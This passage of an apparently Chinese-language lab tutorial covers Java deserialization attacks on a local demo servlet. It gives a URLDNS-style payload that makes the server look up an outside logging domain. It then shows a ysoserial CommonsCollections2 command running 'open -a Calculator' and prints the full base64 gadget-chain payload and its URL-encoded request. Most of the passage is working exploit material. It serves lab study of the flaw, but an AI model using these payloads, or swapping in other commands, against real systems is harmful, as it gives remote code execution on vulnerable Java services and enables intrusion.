http://localhost:8080/demo_war_exploded/deser?str=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa%2FORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F3QAHmFhLjA0ODA0MzdlMzIuaXB2Ni4xNDMzLmV1Lm9yZ3QAAHEAfgAFdAAEaHR0cHB4dAAlaHR0cDovL2FhLjA0ODA0MzdlMzIuaXB2Ni4xNDMzLmV1Lm9yZ3g%3D
```

<img width="978" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/59753cd6-5164-4093-8d5f-5afd416be353">

**2、利用⽤cc2 commons-collections4执行命令**
 Maven 项目中用于添加依赖，增加pom文件内容
```
        <dependency>
            <groupId>org.apache.commons</groupId>
            <artifactId>commons-collections4</artifactId>
            <version>4.0</version>
        </dependency>
```

<img width="792" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/49a82ba0-4ce1-4eb1-8614-ffde50a013f5">

配置命令

```java
java -jar ysoserial-main-49888d3191-1.jar  CommonsCollections2 "open -a Calculator" | base64
```

payload
```
rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuVHJhbnNmb3JtaW5nQ29tcGFyYXRvci/5hPArsQjMAgACTAAJZGVjb3JhdGVkcQB+AAFMAAt0cmFuc2Zvcm1lcnQALUxvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwc3IAQG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuQ29tcGFyYWJsZUNvbXBhcmF0b3L79JkluG6xNwIAAHhwc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAAAdAAObmV3VHJhbnNmb3JtZXJ1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3EAfgALTAAFX25hbWVxAH4ACkwAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP////91cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAJ1cgACW0Ks8xf4BghU4AIAAHhwAAAE+cr+ur4AAAAzAEoKABEAIwcAJAgAJQoAJgAnCgACACgIACkKAAIAKggAEggAKwgALAgALQkAEAAuCgAvADAKAC8AMQcAMgcAQQcANAEAA2NtZAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAuTHlzb3NlcmlhbC9wYXlsb2Fkcy90ZW1wbGF0ZXMvQ29tbWFuZFRlbXBsYXRlOwEACDxjbGluaXQ+AQAEY21kcwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAA1TdGFja01hcFRhYmxlBwAdBwAyAQAKU291cmNlRmlsZQEAFENvbW1hbmRUZW1wbGF0ZS5qYXZhDAAUABUBABBqYXZhL2xhbmcvU3RyaW5nAQAHb3MubmFtZQcANQwANgA3DAA4ADkBAAN3aW4MADoAOwEAAi9jAQAEYmFzaAEAAi1jDAASABMHADwMAD0APgwAPwBAAQATamF2YS9pby9JT0V4Y2VwdGlvbgEALHlzb3NlcmlhbC9wYXlsb2Fkcy90ZW1wbGF0ZXMvQ29tbWFuZFRlbXBsYXRlAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQALdG9Mb3dlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBADt5c29zZXJpYWwvcGF5bG9hZHMvdGVtcGxhdGVzL0NvbW1hbmRUZW1wbGF0ZTEyNzAyNjI5MjU0MzA4NgEAPUx5c29zZXJpYWwvcGF5bG9hZHMvdGVtcGxhdGVzL0NvbW1hbmRUZW1wbGF0ZTEyNzAyNjI5MjU0MzA4NjsHAEEJAEMALgEAEm9wZW4gLWEgQ2FsY3VsYXRvcggARQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHAEcKAEgAIwAhABAASAAAAAEACAASABMAAAACAAEAFAAVAAEAFgAAAC8AAQABAAAABSq3AEmxAAAAAgAXAAAABgABAAAABQAYAAAADAABAAAABQAZAEIAAAAIABsAFQABABYAAACyAAMAAgAAAEQSRrMARAa9AAJLEgO4AAS2AAUSBrYAB5kAECoDEghTKgQSCVOnAA0qAxIKUyoEEgtTKgWyAAxTuAANKrYADlenAARMsQABAAoAPwBCAA8AAwAXAAAALgALAAUACgAKAA0AGgAOAB8ADwAnABEALAASADEAFAA3ABYAPwAZAEIAFwBDABoAGAAAAAwAAQAKADkAHAAdAAAAHgAAAA4ABPwAJwcAHwlQBwAgAAABACEAAAACACJ1cQB+ABgAAAHUyv66vgAAADMAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAxwAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJcHQACEVHSFZJSlRNcHcBAHhzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXg=
```
payload进行url编码后，访问
```
http://localhost:8080/demo_war_exploded/deser?str=rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuVHJhbnNmb3JtaW5nQ29tcGFyYXRvci%2F5hPArsQjMAgACTAAJZGVjb3JhdGVkcQB%2BAAFMAAt0cmFuc2Zvcm1lcnQALUxvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwc3IAQG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuQ29tcGFyYWJsZUNvbXBhcmF0b3L79JkluG6xNwIAAHhwc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh%2Bj%2Fa3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAAAdAAObmV3VHJhbnNmb3JtZXJ1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3EAfgALTAAFX25hbWVxAH4ACkwAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP%2F%2F%2F%2F91cgADW1tCS%2F0ZFWdn2zcCAAB4cAAAAAJ1cgACW0Ks8xf4BghU4AIAAHhwAAAE%2Bcr%2Bur4AAAAzAEoKABEAIwcAJAgAJQoAJgAnCgACACgIACkKAAIAKggAEggAKwgALAgALQkAEAAuCgAvADAKAC8AMQcAMgcAQQcANAEAA2NtZAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAuTHlzb3NlcmlhbC9wYXlsb2Fkcy90ZW1wbGF0ZXMvQ29tbWFuZFRlbXBsYXRlOwEACDxjbGluaXQ%2BAQAEY21kcwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAA1TdGFja01hcFRhYmxlBwAdBwAyAQAKU291cmNlRmlsZQEAFENvbW1hbmRUZW1wbGF0ZS5qYXZhDAAUABUBABBqYXZhL2xhbmcvU3RyaW5nAQAHb3MubmFtZQcANQwANgA3DAA4ADkBAAN3aW4MADoAOwEAAi9jAQAEYmFzaAEAAi1jDAASABMHADwMAD0APgwAPwBAAQATamF2YS9pby9JT0V4Y2VwdGlvbgEALHlzb3NlcmlhbC9wYXlsb2Fkcy90ZW1wbGF0ZXMvQ29tbWFuZFRlbXBsYXRlAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQALdG9Mb3dlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBADt5c29zZXJpYWwvcGF5bG9hZHMvdGVtcGxhdGVzL0NvbW1hbmRUZW1wbGF0ZTEyNzAyNjI5MjU0MzA4NgEAPUx5c29zZXJpYWwvcGF5bG9hZHMvdGVtcGxhdGVzL0NvbW1hbmRUZW1wbGF0ZTEyNzAyNjI5MjU0MzA4NjsHAEEJAEMALgEAEm9wZW4gLWEgQ2FsY3VsYXRvcggARQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHAEcKAEgAIwAhABAASAAAAAEACAASABMAAAACAAEAFAAVAAEAFgAAAC8AAQABAAAABSq3AEmxAAAAAgAXAAAABgABAAAABQAYAAAADAABAAAABQAZAEIAAAAIABsAFQABABYAAACyAAMAAgAAAEQSRrMARAa9AAJLEgO4AAS2AAUSBrYAB5kAECoDEghTKgQSCVOnAA0qAxIKUyoEEgtTKgWyAAxTuAANKrYADlenAARMsQABAAoAPwBCAA8AAwAXAAAALgALAAUACgAKAA0AGgAOAB8ADwAnABEALAASADEAFAA3ABYAPwAZAEIAFwBDABoAGAAAAAwAAQAKADkAHAAdAAAAHgAAAA4ABPwAJwcAHwlQBwAgAAABACEAAAACACJ1cQB%2BABgAAAHUyv66vgAAADMAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ%2BAQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAxwAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJcHQACEVHSFZJSlRNcHcBAHhzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXg%3D
```

